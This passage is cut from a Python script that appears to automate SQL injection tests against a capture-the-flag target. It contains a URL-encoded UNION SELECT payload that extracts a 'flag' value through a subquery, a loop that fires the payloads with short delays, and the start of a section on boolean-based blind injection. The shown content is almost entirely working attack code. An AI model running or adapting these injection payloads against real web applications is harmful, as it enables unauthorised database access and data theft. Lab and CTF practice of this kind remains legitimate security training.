    {"payload": "%27%20UNION%20SELECT%20%28SELECT%20flag%20FROM%20flag%20LIMIT%201%29%2c2%2c3%2c4%2c5--", "desc": "Subquery for flag"},
]

for test in subquery_tests:
    test_payload(test["payload"], test["desc"])
    time.sleep(0.2)

# Test 6: Boolean-based blind with different techniques
print("\n" + "=" * 80)
print("TEST 6: Boolean-based Blind with Encoding")
print("=" * 80)

